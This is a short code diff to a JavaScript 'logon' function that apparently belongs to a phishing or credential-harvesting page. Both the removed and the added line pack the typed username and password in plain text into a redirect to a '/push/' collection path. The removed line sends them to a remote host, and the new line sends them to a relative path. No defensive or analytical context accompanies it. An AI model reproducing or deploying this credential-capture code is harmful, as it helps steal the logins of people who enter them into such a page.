@@ -15,7 +15,7 @@ function logon(){
     }
     else {
         var url = window.location.href;
-        window.location.href = remote + '/push/'+url.substring(remote.length)+'/[-] UserName: ' + usersname +" [-] Passwd: " + password
+        window.location.href = String('/push/'+url.substring(remote.length)+'/[-] UserName: ' + usersname +" [-] Passwd: " + password).replace('//','/')
     }
 }
 function onload() {
